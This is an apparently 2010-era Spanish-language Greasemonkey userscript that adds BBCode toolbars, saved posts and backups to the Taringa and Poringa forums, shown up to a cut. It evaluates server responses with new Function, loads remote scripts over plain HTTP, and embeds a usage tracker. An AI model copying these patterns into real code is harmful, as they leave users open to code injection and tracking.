// ==UserScript==
// @name           BBCodes para Taringa
// @namespace      SharkaleBBCODER
// @description    BBCoderReloaded para T! y P! (Por yasserock & sandinosaso) ATENCION: Si te molesta ser miembro de mi comunidad no instales el script!
// @include        http://*taringa.net/*
// @include        http://*poringa.net/*
// @include        http://plugin.tinypic.com/*
// @exclude        http://br.taringa.com/*
// @require        http://www.sharkale.com.ar/bbcoder/script/jquery.js?v=30.0
// @require        http://www.sharkale.com.ar/bbcoder/script/plugins.js?v=30.0
// @version        31.0
// @copyright      Copyright (c) 2010, Sharkale
// @creator        Sharkale (Alejandro Barreiro) ® 2010 - Modificado y arreglado de bugs (comentarios, links a medios embebidos, preview de posts) a partir del 20/11/2010 por yasserock y sandinosaso
// ==/UserScript==

// **COPYRIGHT NOTICE**
//
//    "BBCoder en Comentarios para T! y P!" Copyright (C) 2008-2010 Alejandro Barreiro
//
//    This program is free software: you can redistribute it and/or modify
//    it under the terms of the GNU General Public License as published by
//    the Free Software Foundation, either version 3 of the License, or
//    (at your option) any later version.
//
//    This program is distributed in the hope that it will be useful,
//    but WITHOUT ANY WARRANTY; without even the implied warranty of
//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//    GNU General Public License for more details.
//
//    You should have received a copy of the GNU General Public License
//    along with this program.  If not, see <http://www.gnu.org/licenses/>.
//
// **END COPYRIGHT NOTICE**

// ==Variables==
var ultversion = '31.0';
var postscript = 'http://www.taringa.net/posts/taringa/4932435/';
var urlscript = 'http://sandinosaso.webcindario.com/taringa/scripts/';
var urlimg = urlscript+'imagenes/';
var urlbuscadortaringa = "http://buscar.taringa.net/web";
var URL = 'http://i268.photobucket.com/albums/jj27/sharkale/taringa/';
var Dom = location.hostname;
var host = location.host;
var Tar = /taringa/i.test(Dom);
var Tiny = /tinypic.com/i.test(Dom);
var Dom2 = Tar? 'tar':'por';
var nuevosemot = 0;
var hoy = new Date();
var txt = $$('body_comm')||$$('body_resp')||$$('markItUp');
var CategoriasT = new Array(-1,"","Ver Todas",7,"animaciones","Animaciones",18,"apuntes-y-monografias","Apuntes y Monografías",4,"arte","Arte",
	25,"autos-motos","Autos y Motos",17,"celulares","Celulares",33,"ciencia-educacion","Ciencia y Educación",19,"comics","Comics e Historietas",
	16,"deportes","Deportes",9,"downloads","Downloads",23,"ebooks-tutoriales","E-books y Tutoriales",34,"ecologia","Ecología",
	29,"economia-negocios","Economía y Negocios",24,"femme","Femme",35,"hazlo-tu-mismo","Hazlo tu mismo",26,"humor","Humor",
	1,"imagenes","Imágenes",12,"info","Info",0,"juegos","Juegos",2,"links","Links",15,"linux","Linux y GNU",22,"mac","Mac",
	32,"manga-anime","Manga y Anime",30,"mascotas","Mascotas",8,"musica","Música",10,"noticias","Noticias",5,"offtopic","Off-topic",
	21,"recetas-y-cocina","Recetas y Cocina",27,"salud-bienestar","Salud y Bienestar",20,"solidaridad","Solidaridad",28,"taringa","Taringa!",
	31,"turismo","Turismo",13,"tv-peliculas-series","TV, Películas y Series",3,"videos","Videos On-line");
var CategoriasP = new Array(-1,"","Ver Todas",7,"animaciones","Animaciones",9,"downloads","Downloads",8,"gay","Gay",1,"imagenes","Imágenes",
	12,"info","Info",2,"links","Links",10,"noticias","Noticias",5,"offtopic","Off-topic",4,"poringueras","Poringueras",
	0,"relatos","Relatos",13,"tv-peliculas-series","TV, Películas y Series",3,"videos","Videos On-line");
// ==/Variables==

if(Tiny){
	$('#branding').css('margin','3px 0 0');
	$('#header li:first a').html('Nueva subida').attr('title','Nueva Subida');
	$('#header li:last a').html('Cuenta');
	$('#header ul li a').css('padding','6px 5px');
	$('#footer').remove();
	if(/login.php/.exec(location.href)){
		$('a[title^=Restablecer]').parent().remove();
		$('label[for=remember-me]').html('¿Recordar en esta PC?');
		$('p a[href^=/plugin/join.php]').parent().remove();
		$(':button').addClass('red').html('¡Iniciar sesión ahora!');
		$('h2:contains(Not yet a member?)').remove();
	}else{
		$(':button').addClass('red').html('¡Subir archivo ahora!');
		$('h1:contains(Cargar)').html('SharkPic® 2010');
		$('text').css('width','180px');
		$('#home_iframe').html('<div align="center" id="home_iframe" style=""><br><br><img src="'+URL+'cargando.gif"><br><br><span style="color:#DF713B;font-size:18px;line-height:18px;font-weight:bold;text-align:center;">Subiendo archivo.</span><br><br><span style="color:#DF713B;font-size:18px;line-height:18px;font-weight:bold;text-align:center;">SharkPic&reg;</span></div>');
	}
	return;
}

var pathA = window.location.pathname.toLowerCase().split('/');
var path = '';
if(pathA[1].indexOf('edicion.form') != -1) path = 'edicion';
switch(pathA[1]){
	case 'agregar':
		path = 'edicion';break;
	case 'posts':
		if(pathA[2] == 'buscador'){path = 'buscador';break;}
		path = 'post';break;
	case 'mensajes-responder.php':
		path = 'mensajes';break;
	case 'mensajes':
		if(pathA[2] == 'redactar' || pathA[2] == 'a') path = 'mensajes';
		else if(pathA[2] == 'leer') path = 'leermp';break;
	case '':case 'home.php':case 'index.php':case 'categorias':
		path = 'principal';break;
	case 'perfil.php':case 'perfil':
		path = 'perfil';break;
	case 'cuenta':
		path = 'cuenta';break;
	case 'favoritos.php':
		path = 'favs';break;
	case 'monitor':case 'monitor.php':
		path = 'monitor';break;
	case 'comunidades':
		if(pathA[3] == 'agregar' || pathA[3] == 'editar-tema') path = 'comuagregar'; else path = 'comunidades';break;
	case 'mod-history':
		path = 'mod';break;
	case 'api':
		return;break;
	case 'sharkale':case 'sharkalebbc':
		path = 'sharkaleBBC';
		break;
}
if(Dom == 'buscar.taringa.net') path = 'buscador-ext';
/////////////////////////////FUNCIONES////////////////////////////////
var user = $('a[class="username"]:first').html();
var datospag = unsafeWindow.global_data;

$('head').append('<link type="text/css" href="http://ajax.googleapis.com/ajax/libs/jqueryui/1.8/themes/base/jquery.ui.all.css" rel="stylesheet"/><link href="'+GM_getValue('sharkale-theme','http://ajax.googleapis.com/ajax/libs/jqueryui/1.7.2/themes/dark-hive/jquery-ui.css')+'" type="text/css" rel="Stylesheet" class="ui-theme">');
var Tynt=Tynt||[];
function WAU_tab(key,position){
	var position=position.split("-");
	var ttl="";
	if($('head title').html()){
		ttl=encodeURIComponent($('head title').html().replace(/(\?=)|(\/)/g,""))
	}
	var e=$('<div id="wau_tab_container" title="Cantidad de gente usando el BBCodeReloaded para T! y P!" onclick="window.location=\'http://whos.amung.us/stats/'+key+'/\'" style="position:fixed;zIndex:5000000;'+position[0]+'=-50px;display:none"></div>');
	if(position[1]=="upper"){
		e.css('top','25%');
	}else{
		if(position[1]=="middle"){
			e.css('top','50%');
		}else{
			if(position[1]=="lower"){
				e.css('top','75%');
			}
		}
	}
	if(position[1]=="left"){
		e.css('left','25%');
	}else{
		if(position[1]=="center"){
			e.css('left','50%');
		}else{
			if(position[1]=="right"){
				e.css('left','75%');
			}
		}
	}
	if(position[0]=="left"||position[0]=="right"){
		e.css('margin.top','-57px');
		e.css('width','50px');
		e.css('height','115px');
	}else{
		e.css('margin-left','-57px');
		e.css('width','115px');
		e.css('height','50px');
	}
	e.css('cursor','pointer');
	e.css('background-image','url(http://whos.amung.us/twidget/'+key+'/'+position[0]+'/'+ttl+')');
	e.css('background-repeat','no-repeat');
	e.hover(
		function(){
			$(this).css(position[0],'-10px')
		},
		function(){
			$(this).css(position[0],'-15px')
		}
	);
	if($('body')){
		$('body').prepend(e);
		setTimeout(function(){WAU_animate_tab(e,position[0],-50)},1600)
	}
}
function WAU_animate_tab(e,position,amt){
	if(amt<=-15){
		e.css(position,amt+'px');
		amt+=5;
		setTimeout(function(){WAU_animate_tab(e,position,amt)},150)
	}else{
		WAU_tab_en=true
	}
}
WAU_tab('muui3gnm3mz4', 'left-top');
if(path == 'mod'){
//me comia mucho ancho de banda esta puta linea
}

// ==Menu y Variables que no se borran==
if(GM_getValue("inicio") == undefined || GM_getValue("inicio") == true){
	GM_setValue("aSWF",true);
	GM_setValue("aSWFhide",true);
	GM_setValue("PunFav",true);
	GM_setValue("EmotVis",true);
	GM_setValue("LinkCheck",true);
	GM_setValue("NovatosPrinc",true);
	GM_setValue("CambiarTheme",true);
	GM_setValue("HideComment",false);
	GM_setValue("inicio",false);
	GM_setValue("mostrarMiEstado",false);
}

var aSWF = GM_getValue("aSWF",true);
var aSWFhide = GM_getValue("aSWFhide",true);
var PunFav = GM_getValue("PunFav",true);
var EmotVis = GM_getValue("EmotVis",true);
var LinkCheck = GM_getValue("LinkCheck",true);
var NovatosPrinc = GM_getValue("NovatosPrinc",true);
var CambiarTheme = GM_getValue("CambiarTheme",true);
var HideComment = GM_getValue("HideComment",false);
var mostarMiEstado = GM_getValue("mostarMiEstado",false);
	
	if(CambiarTheme) GM_registerMenuCommand("BBCodeReloaded para T! y P! - Cambiar el theme de la página", Cambiar_Theme);

	GM_registerMenuCommand("BBCodeReloaded para T! y P! - Reinicializar Valores", function() {
		GM_setValue("inicio",true);
		location.reload();		
	},null,null,"R");

	GM_registerMenuCommand("BBCodeReloaded para T! y P! - Buscar Actualizaciones", function() {
		unsafeWindow.mydialog.procesando_inicio("","Buscando Actualizaciones");
		ActualizarScript({
			url: urlscript+'version-bbcode-taringa.php?'+Math.floor(Math.random()*100000),
			version: ultversion,
			forzado: true,
			segundo: false
     	});
	},null,null,"A");

	GM_registerMenuCommand("BBCodeReloaded para T! y P! - Reportar BUG", function() {
		GM_openInTab("http://www.taringa.net/comunidades/bbcoder/125800/");
	},null,null,"B");
	
	GM_registerMenuCommand("BBCodeReloaded para T! y P! - Aportar Sugerencia", function() {
		GM_openInTab("http://www.taringa.net/comunidades/bbcoder/125814/");
	},null,null,"B");

	GM_registerMenuCommand("BBCodeReloaded para T! y P! - Entrar al post del Script", function() {
		GM_openInTab(postscript);
	},null,null,"P");

	GM_registerMenuCommand("BBCodeReloaded para T! y P! - Versión Instalada: " + ultversion, function() {
		unsafeWindow.mydialog.alert("BBCodeReloaded para T! y P! - yasserock® rulez!","Tu versión del script instalada actualmente es: " + ultversion);
	},null,null,"V");

// ==/Menu==

// ==Funciones==

function Taringa_Set_Function(func, nueva_func){
	if(typeof unsafeWindow == "object"){
		unsafeWindow[func] = nueva_func;
	}
}

/* Funciones mejoradas para tags en agregar post */

function esta(buscar, donde) {
	for(var i=0;i<donde.length;i++){
		if(donde[i] == buscar) return true;
	}
	return false;
}

function unico(tratar){
    var lista = new Array();
    for(var i=0;i<tratar.length;i++){
		tratar[i] = $.trim(tratar[i]);
		if(tratar[i] != ''){
			if(!esta(tratar[i],lista)){
				lista.push(tratar[i]);
			}
		}
    }
    return lista;
}

/* Funciones nuevas */

function $$(elem) {
	return document.getElementById(elem);
}

function CrearBarraBBC(){
		GM_addStyle(".markItUpHeader {padding:5px 0; height:50px !important }.msg_add_comment {margin-top:3px; height:50px !important}");
		var nuevaHTML = '<div id="Sharkale_TaringaBBC" style="display:block;">\
		<a href="" onclick="insertarBBC(\'[b]\', \'[/b]\');return false;"><img src="'+URL+'negrita.png" alt="B" title="Letra Negrita" border="0"></a>\
		<a href="" onclick="insertarBBC(\'[i]\', \'[/i]\');return false;"><img src="'+URL+'cursiva.png" alt="I" title="Letra Cursiva" border="0"></a>\
		<a href="" onclick="insertarBBC(\'[u]\', \'[/u]\');return false;"><img src="'+URL+'subrayado.png" alt="U" title="Letra Subrayada" border="0"></a>\
		<a href="" onclick="botonPrompt(\'letrota\');return false;"><img src="'+URL+'letrota.png" alt="L" title="Crear una imagen con texto gigante" border="0"></a>&nbsp; ';
		if(path != 'post' && path != 'comunidades'){
			nuevaHTML += '<a href="" onclick="insertarBBC(\'[align=left]\', \'[/align]\');return false;"><img src="'+URL+'izquierdo.png" alt="L" title="Alineación Izquierda" border="0"></a>\
			<a href="" onclick="insertarBBC(\'[align=center]\', \'[/align]\');return false;"><img src="'+URL+'centrado.png" alt="C" title="Alineación Centrada" border="0"></a>\
			<a href="" onclick="insertarBBC(\'[align=right]\', \'[/align]\');return false;"><img src="'+URL+'derecho.png" alt="R" title="Alineación Derecha" border="0"></a>\
			<select id="colordefont"style="font-size: 10px;position:relative; top:-4px; min-height: 16px; max-height: 16px;" onchange="insertarBBC(\'[color=\' + $$(\'colordefont\').options[$$(\'colordefont\').selectedIndex].value + \']\', \'[/color]\');this.selectedIndex=0;">\
				<option style="color: black;" value="#"			>Color</option>\
				<option style="color: darkred;" value="darkred"	>Bordo</option>\
				<option style="color: red;" value="red"			>Rojo</option>\
				<option style="color: orange;" value="orange"	>Naranja</option>\
				<option style="color: brown;" value="brown"		>Marrón</option>\
				<option style="color: yellow;" value="yellow"	>Amarillo</option>\
				<option style="color: green;" value="green"		>Verde</option>\
				<option style="color: olive;" value="olive"		>Verde Oliva</option>\
				<option style="color: cyan;" value="cyan"		>Cyan</option>\
				<option style="color: blue;" value="blue"		>Azul</option>\
				<option style="color: darkblue;" value="darkblue">Azul Oscuro</option>\
				<option style="color: indigo;" value="indigo"	>Indigo</option>\
				<option style="color: violet;" value="violet"	>Violeta</option>\
				<option style="color: black;" value="black"		>Negro</option>\
			</select>\
			<select id="tipodefont" style="font-size: 10px; position:relative; top:-4px; min-height: 16px; max-height: 16px;" onchange="insertarBBC(\'[font=\' + $$(\'tipodefont\').options[$$(\'tipodefont\').selectedIndex].value + \']\', \'[/font]\');this.selectedIndex=0;">\
				<option value="#">Fuente</option>\
				<option value="American Typewriter" style="font-family: American Typewriter;">American Typewriter</option>\
				<option value="Arial" style="font-family: Arial;">Arial</option>\
				<option value="Arial Black" style="font-family: Arial Black;">Arial Black</option>\
				<option value="Calibri" style="font-family: Calibri;">Calibri</option>\
				<option value="Century" style="font-family: Century;">Century</option>\
				<option value="Chiller" style="font-family: Chiller;">Chiller</option>\
				<option value="Comic Sans MS" style="font-family: Comic Sans MS;">Comic Sans MS</option>\
				<option value="Courier New" style="font-family: Courier New;">Courier New</option>\
				<option value="FixedSys" style="font-family: FixedSys;">FixedSys</option>\
				<option value="French Script MT" style="font-family: French Script MT;">French Script MT</option>\
				<option value="Georgia" style="font-family: Georgia;">Georgia</option>\
				<option value="Impact" style="font-family: Impact;">Impact</option>\
				<option value="Lucida Sans" style="font-family: Lucida Sans;">Lucida Sans</option>\
				<option value="Lucida Console" style="font-family: Lucida Console;">Lucida Console</option>\
				<option value="Monotype Corsiva" style="font-family: Monotype Corsiva;">Monotype Corsiva</option>\
				<option value="Times New Roman" style="font-family: Times New Roman;">Times New Roman</option>\
				<option value="Traditional Arabic" style="font-family: Traditional Arabic;">Traditional Arabic</option>\
				<option value="Trebuchet MS" style="font-family: Trebuchet MS;">Trebuchet</option>\
				<option value="Verdana" style="font-family: Verdana;">Verdana</option>\
			</select>\
			<select id="sizedefont" style="font-size: 10px; position:relative; top:-4px; min-height: 16px; max-height: 16px;" onchange="insertarBBC(\'[size=\' + $$(\'sizedefont\').options[$$(\'sizedefont\').selectedIndex].value + \']\', \'[/size]\');this.selectedIndex=1;">\
				<option value="#" selected="selected">Tama&ntilde;o&nbsp;</option>\
				<option value="9">9px</option>\
				<option value="12">12px</option>\
				<option value="14">14px</option>\
				<option value="16">16px</option>\
				<option value="18">18px</option>\
				<option value="20">20px</option>\
				<option value="22">22px</option>\
				<option value="24">24px</option>\
			</select><br>';
		}
		nuevaHTML += '<a href="" onclick="botonPrompt(\'vyoutube\');return false;"><img src="'+URL+'youtube.png" alt="YT" title="Insertar Video de YouTube" border="0"></a>\
		<a href="" onclick="botonPrompt(\'vgoogle\');return false;"><img src="'+URL+'google.png" alt="GV" title="Insertar Video de Google Video" border="0"></a>\
		<a href="" onclick="botonPrompt(\'vmegavideo\');return false;"><img src="'+URL+'megavideo.png" alt="MV" title="Insertar Video de MegaVideo" border="0"></a>\
		<a href="" onclick="botonPrompt(\'mixpod\');return false;"><img src="'+URL+'mixpod.png" alt="MP" title="Insertar una playlist de MixPod" border="0"></a>\
		<a href="" onclick="botonPrompt(\'goear\');return false;"><img src="'+URL+'goear.png" alt="GE" title="Insertar una Canción de GoEar" border="0"></a>\
		<a href="" onclick="botonPrompt(\'esnips\');return false;"><img src="'+URL+'esnips.png" alt="EN" title="Insertar una Canción de eSnips" border="0"></a>\
		<a href="" onclick="botonPrompt(\'99polls\');return false;"><img src="'+URL+'99polls.png" alt="99" title="Insertar una encuesta de 99polls" border="0"></a>\
		<a href="" onclick="botonPrompt(\'swf\');return false;"><img src="'+URL+'swf.png" alt="F" title="Insertar archivo SWF" border="0"></a>\
		<a href="" onclick="botonPrompt(\'image\');return false;"><img src="'+URL+'imagen.png" alt="I" title="Insertar una Imagen" border="0"></a>\
		<a href="" onclick="botonPrompt(\'imageclick\');return false;"><img src="'+URL+'imagen-click.png" alt="IC" title="Insertar una Imagen Clickeable" border="0"></a>\
		<a href="" onclick="botonPrompt(\'link\');return false;"><img src="'+URL+'link.png" alt="U" title="Insertar URL" border="0"></a>\
		<a href="" onclick="botonPrompt(\'url2bbc\');return false;"><img src="'+URL+'link.png" alt="U2" title="Insertar BBCode a todas las URL" border="0"></a>\
		<a href="" onclick="botonPrompt(\'quote\');return false;"><img src="'+URL+'quote.png" alt="C" title="Insertar Cita" border="0"></a>&nbsp;';
		if(path == 'post' || path == 'mensajes' || path == 'comunidades' || path == 'comuagregar'){
			nuevaHTML +='<a href="" onclick="preview();return false;"><img src="'+URL+'preview.png" alt="P" title="Ver Preview del Comentario" border="0"></a>';
		}
		if(path == 'post' || path == 'comunidades'){
			nuevaHTML +='&nbsp;<a href="" onclick="act_comment();return false;"><img src="'+urlimg+'act_comment.png" class="carg_act_comm" title="Actualizar Comentarios" height="16" style="margin-left:5px;"/></a>';
		}
		nuevaHTML += '</div>';
		return nuevaHTML;
}

function CrearBarraColores(){
		var colores = new Array('#000000','#222222','#444444','#666666','#888888','#AAAAAA','#000000','#000040','#000080','#0000BF','#0000FF','#004000','#004040','#004080','#0040BF','#0040FF','#008000','#008040','#008080','#0080BF','#0080FF','#00BF00','#00BF40',
			'#00BF80','#00BFBF','#00BFFF','#00FF00','#00FF40','#00FF80','#00FFBF','#00FFFF','#400000','#400040','#400080','#4000BF','#4000FF','#404000','#404040','#404080','#4040BF','#4040FF','#408000','#408040','#408080','#4080BF','#4080FF','#40BF00','#40BF40',
			'#40BF80','#40BFBF','#40BFFF','#40FF00','#40FF40','#40FF80','#40FFBF','#40FFFF','#800000','#800040','#800080','#8000BF','#8000FF','#804000','#804040','#804080','#8040BF','#8040FF','#808000','#808040','#808080','#8080BF','#8080FF','#80BF00','#80BF40',
			'#80BF80','#80BFBF','#80BFFF','#80FF00','#80FF40','#80FF80','#80FFBF','#80FFFF','#BF0000','#BF0040','#BF0080','#BF00BF','#BF00FF','#BF4000','#BF4040','#BF4080','#BF40BF','#BF40FF','#BF8000','#BF8040','#BF8080','#BF80BF','#BF80FF','#BFBF00','#BFBF40',
			'#BFBF80','#BFBFBF','#BFBFFF','#BFFF00','#BFFF40','#BFFF80','#BFFFBF','#BFFFFF','#FF0000','#FF0040','#FF0080','#FF00BF','#FF00FF','#FF4000','#FF4040','#FF4080','#FF40BF','#FF40FF','#FF8000','#FF8040','#FF8080','#FF80BF','#FF80FF','#FFBF00','#FFBF40',
			'#FFBF80','#FFBFBF','#FFBFFF','#FFFF00','#FFFF40','#FFFF80','#FFFFBF','#FFFFFF');
		var nuevaHTML = '<div id="Sharkale_TaringaColores" style="position: absolute!important;margin-left:-85px"><table border="0" cellpadding="0" cellspacing="1" align="center" bgcolor="#000000" onmouseover="this.style.cursor=\'pointer\'"><tbody><tr>'; 
		for(var i = 1; i < colores.length; i++){
			nuevaHTML += '<td bgcolor="'+colores[i]+'"><img src="'+URL+'spacer.gif" onclick="insertarBBC(\'[color='+colores[i]+']\', \'[/color]\')" alt="'+colores[i]+'" title="'+colores[i]+'" width="15" height="11"></td>';
			if(i%5 == 0 && i != colores.length-1) nuevaHTML += '</tr><tr>';
		}
		nuevaHTML += "</tr></tbody></table></div>";
		return nuevaHTML;
}

function Procesar_Datos(datos){
	if(datos == 'Disculpas! Hubo un error al procesar lo solicitado. Por favor, int&eacute;ntalo nuevamente en unos minutos.'){
		return 'Taringa no responde. =)';
	}else if(datos["error"]){
		switch(datos["error"]["code"]){
			case 1: return 'Método Perdido.';break;
			case 2: return 'Clave para API Inválida.';break;
			case 3:	return 'Formato Inválido.';break;
			case 4: return 'Método Inválido.';break;
			case 5: return 'Faltan Parámetros..';break;
			case 6: return 'Nick de Usuario Inválido.';break;
			case 7: return 'Parámetro Inválido.';break;
			case 8: return 'Sin Datos.';break;
			case 9: return 'Post Eliminado.';break;
			case 10: return 'Post Privado.';break;
			case 11: return 'Límite de pedidos por minuto superado.';break;
			default: return 'Error desconocido';
		}
	}else{
		return new Function("return "+datos)();
	}
}

var sepBBC = '//#//';

function obtenerPostGuardados(){
	var post_GuarAux = GM_getValue('PostGuardados', 'SGVjaG8gcG9yIFNoYXJrYWxlwq4=//#//SGVjaG8gcG9yIFNoYXJrYWxlwq4=//#//SGVjaG8gcG9yIFNoYXJrYWxlwq4=//#//Q3JlYWRvcg==');
	var post_GuarAux = post_GuarAux.split(sepBBC);
	return post_GuarAux;			 
}

function CrearBarraPostGuardados(){
	GM_addStyle("#Sharkale_PostGuardados li{padding:5px 10px;font-weight:bold;margin-top:2px;}");
	var nuevaHTML = '<ul id="Sharkale_PostGuardados" class="ui-widget ui-helper-clearfix">';
	var posts = obtenerPostGuardados();
	if(posts.length == 1) return nuevaHTML += "</ul>";
	var c=0;
	for (var i = 0; i < posts.length; i=i+4){
		c++;
		nuevaHTML += '<li pos="'+c+'" class="ui-state-default ui-corner-all"><a href="" titulo="'+posts[i]+'" cuerpo="'+posts[i+1]+'" tags="'+posts[i+2]+'" nom="'+posts[i+3]+'" onclick="Obtener_PostGuardados(\''+c+'\');return false">'+Base64.decode(posts[i+3])+'</a><span onclick="$(\'#Sharkale_PostGuardados li[pos='+c+']\').slideUp(500,function(){$(\'#Sharkale_PostGuardados li[pos='+c+']\').remove()})" class="ui-icon ui-icon-circle-close" style="float:right" title="Borrar Post Archivado"/></li>';
	}
	nuevaHTML += "</ul>";
	return nuevaHTML;
}

function Agregar_PostGuardados(){
	var nom = prompt('Ingrese un nombre para identificar el Post.\n\nEjemplo: "Crap"');
	if(nom != '' && nom != null){
		var li = $('#Sharkale_PostGuardados');
		if(li.find('li').size() != 0){
			var ult = parseInt(li.find('li:last').attr('pos'))+1;
			li.append('<li pos="'+ult+'" class="ui-state-default ui-corner-all"><a href="" titulo="'+Base64.encode($(':input[name=titulo]').val())+'" cuerpo="'+Base64.encode($(':input[name=cuerpo]').val())+'" tags="'+Base64.encode($(':input[name=tags]').val())+'" nom="'+Base64.encode(nom)+'" onclick="Obtener_PostGuardados(\''+ult+'\');return false">'+nom+'</a><span onclick="$(\'#Sharkale_PostGuardados li[pos='+ult+']\').slideUp(500,function(){$(\'#Sharkale_PostGuardados li[pos='+ult+']\').remove()})" class="ui-icon ui-icon-circle-close" style="float:right" title="Borrar Post Archivado"/></li>');
		}else{
			li.html('<li pos="1" class="ui-state-default ui-corner-all"><a href="" titulo="'+Base64.encode($(':input[name=titulo]').val())+'" cuerpo="'+Base64.encode($(':input[name=cuerpo]').val())+'" tags="'+Base64.encode($(':input[name=tags]').val())+'" nom="'+Base64.encode(nom)+'" onclick="Obtener_PostGuardados(\'1\');return false">'+nom+'</a><span onclick="$(\'#Sharkale_PostGuardados li[pos=1]\').slideUp(500,function(){$(\'#Sharkale_PostGuardados li[pos=1]\').remove()})" class="ui-icon ui-icon-circle-close" style="float:right" title="Borrar Post Archivado"/></li>');
		}
	}else unsafeWindow.mydialog.alert("Archivo de Posts - Sharkale®",'Debe elegirle un nombre al Post para guardarlo.');
}

function Guardar_PostGuardados(){
	if(confirm('¿Estás seguro que deseas guardar los cambios en el Archivo de Posts?\n\nEste cambio es permanente.')){
		var li = $('#Sharkale_PostGuardados li');
		var guardar = '';
		var titulo = '';
		var cuerpo = '';
		var tags = '';
		var nom = '';
		for(var i=0; i<li.length; i++){
			titulo = li.eq(i).find('a').attr('titulo');
			cuerpo = li.eq(i).find('a').attr('cuerpo');
			tags = li.eq(i).find('a').attr('tags');
			nom = li.eq(i).find('a').attr('nom');
			guardar += titulo+sepBBC+cuerpo+sepBBC+tags+sepBBC+nom;
			if(i < li.length-1) guardar += sepBBC;
		}
		GM_setValue('PostGuardados', guardar);
	}
}

Taringa_Set_Function("Obtener_PostGuardados", function(pos){
	var resp = confirm("¿Estás seguro que deseas ver el post archivado?\n\nEsta acción borrará cualquier post que estes realizando actualmente.");
	if(resp){
		var archivo = $('#Sharkale_PostGuardados li[pos='+pos+'] a');
		$(':input[name=titulo]').val(Base64.decode(archivo.attr('titulo')));
		$(':input[name=cuerpo]').val(Base64.decode(archivo.attr('cuerpo')));
		$(':input[name=tags]').val(Base64.decode(archivo.attr('tags')));
	}
});

var timer_backup;
function Guardar_backup(){
	tit = $(':input[name=titulo]').val();
	cue = $(':input[name=cuerpo]').val();
	tag = $(':input[name=tags]').val();
	backupaguardar = Base64.encode(tit)+sepBBC+Base64.encode(cue)+sepBBC+Base64.encode(tag);
	GM_setValue('backup', backupaguardar);
	$('#post_agregar .box_cuerpo').effect('highlight');
}

function Backup_on_off(){
	if(timer_backup == undefined || $('#Btn_Backup').attr('activo') == 'si'){
		var resp = confirm("¿Estás seguro que deseas activar el autobackup?\n\nEsta acción borrará cualquier backup previamente realizado.\n\nEl fondo del formulario de Agregar Post titilará de amarillo cada vez que se actualice el backup.");
		if(resp){
			$('#Btn_Backup').val('Desactivar Auto-Backup').attr('activo','no');
			$.timer(10000, function(timer){
				Guardar_backup();
				timer_backup = timer;
			});
		}
	}else{
		$('#Btn_Backup').val('Activar Auto-Backup').attr('activo','si');
		timer_backup.stop();
	}
}

function Ver_backup(){
	var resp = confirm("¿Estás seguro que deseas ver el backup guardado?\n\nEsta acción borrará cualquier post que estes realizando actualmente.");
	if(resp){
		var backup = GM_getValue('backup','');
		if(backup != ''){
			var backup = backup.split(sepBBC);
			$(':input[name=titulo]').val(Base64.decode(backup[0]));
			$(':input[name=cuerpo]').val(Base64.decode(backup[1]));
			$(':input[name=tags]').val(Base64.decode(backup[2]));
		}else{
			unsafeWindow.mydialog.alert("Backup de post - Sharkale®",'No hay backup guardado.');
		}
	}
}

function obtenerBBCguardados(){
	var bbc_GuarAux = GM_getValue('BBCguardados', 'SGVjaG8gcG9yIFNoYXJrYWxlwq4=//#//Q3JlYWRvcg==');
	var bbc_GuarAux = bbc_GuarAux.split(sepBBC);
	return bbc_GuarAux;			 
}

function CrearBarraBBCguardados(){
	GM_addStyle("#Sharkale_BBCguardados li{padding:5px 10px;font-weight:bold;margin-top:2px;}");
	var nuevaHTML = '<ul id="Sharkale_BBCguardados" class="ui-widget ui-helper-clearfix">';
	var bbc = obtenerBBCguardados();
	if(bbc.length == 1) return nuevaHTML += "</ul>";
	var c=0;
	for (var i = 0; i < bbc.length; i=i+2){
		c++;
		nuevaHTML += '<li pos="'+c+'" class="ui-state-default ui-corner-all"><a href="" bbc="'+bbc[i]+'" nom="'+bbc[i+1]+'" onclick="insertarBBC($(this).attr(\'bbc\'),\'bbcperso\');return false">'+Base64.decode(bbc[i+1])+'</a><span onclick="$(\'#Sharkale_BBCguardados li[pos='+c+']\').slideUp(500,function(){$(\'#Sharkale_BBCguardados li[pos='+c+']\').remove()})" class="ui-icon ui-icon-circle-close" style="float:right" title="Borrar BBCode"/></li>';
	}
	nuevaHTML += "</ul>";
	return nuevaHTML;
}

function Agregar_BBCguardados(){
	var inicio = txt.selectionStart;
	var fin   = txt.selectionEnd;
	var seleccion = txt.value.substr(inicio, (fin - inicio));
	if(seleccion != ''){
		var nom = prompt('Ingrese un nombre para identificar el BBC.\n\nEjemplo: "Mi menú taringuero"');
		if(nom != '' && nom != null){
			var li = $('#Sharkale_BBCguardados');
			if(li.find('li').size() != 0){
				var ult = parseInt(li.find('li:last').attr('pos'))+1;
				li.append('<li pos="'+ult+'" class="ui-state-default ui-corner-all"><a href="" bbc="'+Base64.encode(seleccion)+'" nom="'+Base64.encode(nom)+'" onclick="insertarBBC($(this).attr(\'bbc\'),\'bbcperso\');return false">'+nom+'</a><span onclick="$(\'#Sharkale_BBCguardados li[pos='+ult+']\').slideUp(500,function(){$(\'#Sharkale_BBCguardados li[pos='+ult+']\').remove()})" class="ui-icon ui-icon-circle-close" style="float:right" title="Borrar BBCode"/></li>');
			}else{
				li.html('<li pos="1" class="ui-state-default ui-corner-all"><a href="" bbc="'+Base64.encode(seleccion)+'" nom="'+Base64.encode(nom)+'" onclick="insertarBBC($(this).attr(\'bbc\'),\'bbcperso\');return false">'+nom+'</a><span onclick="$(\'#Sharkale_BBCguardados li[pos=1]\').slideUp(500,function(){$(\'#Sharkale_BBCguardados li[pos=1]\').remove()})" class="ui-icon ui-icon-circle-close" style="float:right" title="Borrar BBCode"/></li>');
			}
		}else unsafeWindow.mydialog.alert("BBCodes Personalizados - Sharkale®",'Debe elegirle un nombre al BBC para guardarlo.');
	}else unsafeWindow.mydialog.alert("BBCodes Personalizados - Sharkale®",'Seleccione un texto a guardar.');
}

function Guardar_BBCguardados(){
	if(confirm('¿Estás seguro que deseas guardar los cambios en los BBCodes?\n\nEste cambio es permanente.')){
		var li = $('#Sharkale_BBCguardados li');
		var guardar = '';
		var bbc = '';
		var nom = '';
		for(var i=0; i<li.length; i++){
			bbc = li.eq(i).find('a').attr('bbc');
			nom = li.eq(i).find('a').attr('nom');
			guardar += bbc+sepBBC+nom;
			if(i < li.length-1) guardar += sepBBC;
		}
		GM_setValue('BBCguardados', guardar);
	}
}

function obtenerEmoticones(){
	var emot_GuarAux = GM_getValue('emoticones', '');
	var emot_GuarAux = emot_GuarAux.split(',');
	return emot_GuarAux;			 
}

